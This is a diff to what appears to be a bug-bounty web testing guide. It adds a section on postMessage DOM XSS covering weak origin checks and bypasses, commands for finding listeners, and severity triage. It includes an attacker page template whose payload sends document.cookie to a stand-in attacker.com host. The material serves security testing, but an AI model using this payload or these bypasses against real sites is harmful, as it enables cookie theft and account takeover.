@@ -123,6 +123,8 @@ element.src = userInput         // JavaScript URI possible
 location.href = userInput
 ```
 
+> **postMessage is a DOM XSS source** — same sinks above (innerHTML, eval, etc.) become reachable when fed by `addEventListener("message", ...)` without proper `event.origin` validation. See **postMessage Testing** below.
+
 ### XSS Bypass Techniques
 ```javascript
 // CSP bypass — unsafe-inline blocked
@@ -138,6 +140,73 @@ location.href = userInput
 - XSS + CSRF token theft = CSRF bypass on critical action
 - XSS + service worker = persistent XSS across pages
 - XSS + credential theft via fake login form = ATO
+
+### postMessage Testing
+DOM XSS variant where `window.addEventListener("message", ...)` lacks proper `event.origin` validation. Common on SDK callbacks, OAuth redirect handlers, iframe widgets, chat/analytics scripts — easy to miss because the entry point is **indirect** (no URL parameter, no form field, source-code grep alone doesn't reveal whether the origin check is sound).
+
+**Vulnerable pattern:**
+```js
+window.addEventListener("message", (e) => {
+  // No e.origin check → any page can postMessage in
+  document.getElementById("x").innerHTML = e.data
+})
+```
+
+**Common origin-check bypasses:**
+
+| Weak check | Bypass | Example that passes |
+|---|---|---|
+| `e.origin.indexOf("trusted")` | substring anywhere | `https://trusted.attacker.com` |
+| `e.origin.startsWith("https://trusted")` | suffix attack | `https://trusted.attacker.com` |
+| `e.origin.endsWith(".trusted.com")` | infix attack | `https://evil-trusted.com` (no dot prefix) |
+| `e.origin === "null"` | sandboxed iframe | `srcdoc`/`sandbox` iframe → origin literally `"null"` |
+| Regex with unescaped `.` | `.` matches any char | `/https?:\/\/trusted\.com/` matches `https://trusted-com.evil.com` |
+| No check at all | (just listen) | Any origin |
+
+**Finding listeners:**
+```js
+// DevTools console (Chromium) — list every message listener registered on window
+getEventListeners(window).message
+```
+```bash
+# Source grep when you have JS bundles
+grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" | grep -v node_modules
+```
+- Burp extension: **postMessage-tracker** — auto-logs every postMessage with sender origin
+- The actual signal is whether the **sink fires**, not whether a listener exists — always confirm with the attacker page below
+
+**Attacker page template:**
+```html
+<!-- Hosted on attacker.com -->
+<iframe src="https://victim.com" id="v"></iframe>
+<script>
+  document.getElementById('v').onload = () => {
+    document.getElementById('v').contentWindow.postMessage(
+      '<img src=x onerror=fetch("//attacker.com/?c="+document.cookie)>',
+      '*'  // wildcard target — works regardless of origin policy on send
+    )
+  }
+</script>
+```
+
+**Chains That Pay:**
+```
+postMessage -> innerHTML/eval sink -> DOM XSS                          High
+postMessage -> OAuth code/state passing -> code theft -> ATO           Critical
+postMessage -> localStorage token override -> session manipulation     High
+postMessage -> JSON deserialize sink (eval/Function) -> RCE            Critical (rare)
+postMessage handler strict-equals origin (no bypass found)             N/A
+SDK postMessage with internal-only contract (no public callers)        Info (chain only)
+```
+
+**Triage:**
+```
+Listener missing origin check + reachable XSS sink (innerHTML/eval)   = High/Critical
+Listener missing origin check + OAuth code/state flows through it     = Critical (ATO)
+Listener present + origin check has substring/regex bypass            = same severity, PoC required
+Listener present + strict equality on origin (=== exact match)        = N/A
+Listener exists but only logs / no DOM mutation                       = Low/Info
+```
 
 ---
 
